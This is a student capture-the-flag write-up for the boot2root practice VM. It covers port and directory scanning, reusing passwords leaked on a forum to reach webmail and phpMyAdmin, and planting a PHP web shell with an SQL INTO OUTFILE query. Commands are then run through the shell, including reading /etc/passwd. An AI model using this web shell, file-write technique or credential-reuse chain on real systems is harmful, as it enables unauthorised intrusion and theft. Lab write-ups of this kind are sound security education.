# boot2root

## Table of content

- [boot2root](#boot2root)
  - [Table of content](#table-of-content)
  - [Introduction](#introduction)
  - [Finding the IP Address](#finding-the-ip-address)
  - [Enumeration](#enumeration)
  - [Gaining Access](#gaining-access)
    - [Writeup 1](#writeup-1)


## Introduction

This Hive Helsinki Project is about finding ways to gain root access on the boot2root virtual machine. Check the [subject file](https://github.com/iljaSL/boot2root/blob/main/en.subject.pdf) for more information.

## Finding the IP Address

The Boot2Root machine does not present the IP address of the VM on the start display as the Darkly machine does.
It's still rather easy to gather that piece of information. My Host Machine is running on Windows, I'm using VMWare as my virtualization tool for this project.
We can simply use `arp -a` or `ipconfig /all` to find the IP address of our b2r machine. If you have trouble to find the machine within your many assigned networks, as I did, you can simply find it with the help of the assigned MAC address that you can find within the VMWare machine settings, it's also similar on VirtualBox.

The explanation above is only valid for `Host-only` Network Adapters. If you have your Attack Machine somewhere else running rather than as a VM on your Host machine, you need to switch your Network connection to `Bridged` to be able to access the Target VM b2r. Finding the IP Address of the Target VM with `ipconfig` or `arp`, was at least not possible for me through the MAC Address with Virtual Box or VMware. If you choose the `Bridged` connection, the VM will be directly connected to the physical network, in my case an Intel Killer Wireless Adapter. You will be able to find the Adapters IP address via `ipconfig` or `arp`.
Scan the Adapters IP Range with nmap for example:

```
nmap 192.100.0.0-255
```
Nmap will find the open ports to the corresponding IP Address of the b2r Target VM.

## Enumeration

As always, let's start the Enumeration with Nmap and the following command:
```
nmap -sC -sV <IP>
```
`-sC (Script scan, very noisy, should be only performed with permission)` <br>
`-sV (Version detection)`

The result:
```
PORT    STATE  SERVICE  VERSION
21/tcp  open   ftp      vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open   ssh      OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
53/tcp  closed domain
80/tcp  open   http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hack me if you can
|_http-server-header: Apache/2.2.22 (Ubuntu)
143/tcp open   imap     Dovecot imapd
|_ssl-date: 2021-12-19T17:28:20+00:00; +1s from scanner time.
|_imap-capabilities: more post-login IDLE SASL-IR IMAP4rev1 ENABLE listed LOGIN-REFERRALS ID capabilities Pre-login OK LOGINDISABLEDA0001 have LITERAL+ STARTTLS
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
443/tcp open   ssl/http Apache httpd 2.2.22
|_http-title: 404 Not Found
|_ssl-date: 2021-12-19T17:28:20+00:00; +1s from scanner time.
|_http-server-header: Apache/2.2.22 (Ubuntu)
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
993/tcp open   ssl/imap Dovecot imapd
|_imap-capabilities: CAPABILITY
|_ssl-date: 2021-12-19T17:28:20+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
```

The most interesting part of the Nmap enumeration are the ports 80 and 443, which indicates that b2r is hosting a website. A quick check with the browser, and indeed a Website with a straightforward instruction is being displayed.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/http_landing_page.png">
</p>

This discovery looks like the most promising lead in order to gain root access on the server and will be the first attempt on the list of gaining it.

The Enumeration is not over yet though. Let's dig in a bit deeper and find hidden web content with Gobuster.

Port 80 (http):
```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php

/forum                (Status: 403) [Size: 285]
/fonts                (Status: 301) [Size: 312]
/server-status        (Status: 403) [Size: 293]
```
Port 443 (https):
```
gobuster dir -k -u https://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php

/forum                (Status: 301) [Size: 314]
/webmail              (Status: 301) [Size: 316]
/phpmyadmin           (Status: 301) [Size: 319]
/server-status        (Status: 403) [Size: 294]
```
`-k (Skip TLS certificate verification)`

That result is very promising, especially the fact that phpmyadmin has been deployed to the production web server. Which would give me easy access to the Database and does have an infamous security history. I also now know that MySQL is being used as the Database.

## Gaining Access

### Writeup 1

The Port 80 results are quite discouraging as they returned the Status 403, meaning the access to that specific web content is forbidden. Port 443 looks much promising though, as most of the content is being redirected. I'm being greeted with a login page for `/webmail` and `/phpmyadmin`, that means that I need to find some credentials in order to access them. The Forum looks already much promising as I don't need to login in order to access it.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/forum_landing_page.png">
</p>

I am presented with a lot of valuable information on the Forum, the most important one first, I am able to read all the posted forum posts. I see that there are 6 users registered, and the most convenient part is that the users are all neatly listed when I click the `Users` tab. The Forum itself is powered by little forum, that will be definitely helpful for later!

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/forum_user_area.png">
</p>

I'm able to email the admin, I tried to test it for a XSS vulnerability, which did not work, refreshing the page also resulted in some weird buggy behaviors, I will for now set it aside and focus on the forum posts instead until I get stuck in which case I could investigate that issue closer.
The most of the posts are not interesting and do not provide any important information except the post `Probleme login ?` from the user `lmezard`. lmezard is sharing logs of (many) failed SSH login attempts. One login attempt looks really interesting, the username for this attempt was `!q\]Ej?*5K5cy*AJ`, which does look quite like a password.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/user_logs_with_pw.png">
</p>

I tried (just in case) to use SSH to gain access to the Server with lmezard Credentials, but that did not work.
What should users definitely don't do with their passwords, but still do on every registration?
Correct, reusing their passwords. So I tried to reuse lmezard's credentials on the services that we have access to.
It did not work with SquirrelMail, as the username probably need to be a valid email.
BUT it worked indeed with the Forum. I have now access to lmezard's forum account.
There is nothing really interesting to find, except lmezard's email `laurie@borntosec.net`, which I think could help with the SquirrelMail login attempt.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/forum_user_profile.png">
</p>

The login attempt to SquirrelMail with lmezard's and password worked as well, no surprise there.
Of course, this is just a school Project, but nevertheless many users are reusing their passwords for different accounts and this chain of account takeovers is quite common in the real world, so if anyone out there is reading this random as CTF write-up, PLEASE USE A PASSWORD MANAGER!
Back to SquirrelMail and lmezard's inbox. There are only 2 mails in the inbox, and the one titled `DB Access` is really interesting, as it contains the root credentials for a Database.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/db_access_email.png">
</p>

We gained access to phpmyadmin and the Forum Database.

<p align="center">
  <img src="https://github.com/iljaSL/boot2root/blob/main/images/writeup1/forum_db.png">
</p>

Now I need to find out on how I can establish a reverse shell on the Server with the DB root account.
I stumbled across this guide here: [Shell Uploading Server Phpmyadmin](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/)

It did gave me some hints on how the attack is performed, but the article is not really explaining on how or what exactly we are exploiting. We are basically creating a backdoor in order to launch a Webshell in our case via the Forum. This technique described in the article is mostly used through a SQL injection attack, which we luckily do not need to perform as we have full access to the DB root account. We will create a Webshell with the help of PHP, which parameters will be passed by `cmd` and wil be executed.

```
<?system($_REQUEST['cmd']);?>
```

I will create a filed inside the `templates_c` directory, which is created by default while setting up my little forum: [My Little Forum Github Source Code](https://github.com/ilosuna/mylittleforum) <br>
That directory does have usually excessive permissions.
The SQL query will look like this:
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
```
The query went through successfully!
Okay, let's check if we can execute any shell commands with the following crafted URL:
```
https://<IP>/forum/templates_c/backdoor.php?cmd=whoami
```
It worked! We got the following response (I'm using BurpSuite's Repeater for the upcoming requests):

TODO: CMD_WHOAMI IMAGE

Let's see if we can get access to some more interesting information with:
```
https://<IP>/forum/templates_c/backdoor.php?cmd=cat%20/etc/passwd
```
TODO: CMD_ETC_PASSWD IMAGE

Now we do have a much better picture on boot2roots users.
After a bit of traversing through the server's directories, I discovered an interesting dir called `LOOKATME`, which also does have the right permission to access it.

TODO: CMD_LOOKATME

The directory does include an even better file to look at, which is called `password` with the following data:
```
lmezard:G!@M6f4Eatau{sF"
```
So far so good, now I have to figure out for which exact service this credentials are used for.
Unfortunately those credentials do not work with SSH, but we also have a FTP Service running that we discovered during our enumeration with Nmap, and those credentials to work indeed with FTP!
We have access to two files while logged in with lmezard, `README` and `fun`. Let's get them with the ftp `get` command and check out what's inside.

README:
```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```
That's a clear message that we got from the README on what to do next.
Fun is actually a ZIP which contains a dir called `ft_fun` with lots of `.pcap` files, actually exact 750 files. PCAP files contain packet data of a network, which can be usually opened with application like Wireshark, but I get an error when trying to open those files with Wireshark, as it does can not read those files which is really odd.
Checking the type of the files with the `file` command results in a really interesting find.
Those files are ASCII text files and taking a closer look reveals the following output in one of those files:
```
//file363       printf("Hahahaha Got you!!!\n");
```